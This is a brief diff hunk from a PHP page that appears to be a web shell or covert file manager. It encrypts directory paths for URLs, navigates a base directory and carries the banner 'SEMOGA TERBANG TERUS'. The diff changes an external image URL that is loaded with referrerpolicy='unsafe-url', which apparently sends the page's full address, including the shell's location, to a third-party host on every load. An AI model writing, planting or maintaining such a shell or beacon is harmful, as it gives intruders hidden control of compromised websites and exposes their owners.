@@ -330,7 +330,7 @@ $encDir = urlencode(aes_encrypt($dir));
     <div class="header-card">
         <div class="d-flex flex-wrap justify-content-between align-items-center gap-3">
             <h1 class="header-title">
-                <img src="https://ik.imagekit.io/expx/Fly.gif?updatedAt=1753923170416" referrerpolicy="unsafe-url" />SEMOGA TERBANG TERUS
+                <img src="https://ik.imagekit.io/readme404/Fly.gif?updatedAt=1753923170416" referrerpolicy="unsafe-url" />SEMOGA TERBANG TERUS
             </h1>
             <div class="d-flex gap-2 flex-wrap">
                 <?php if ($dir !== $base_dir): ?>
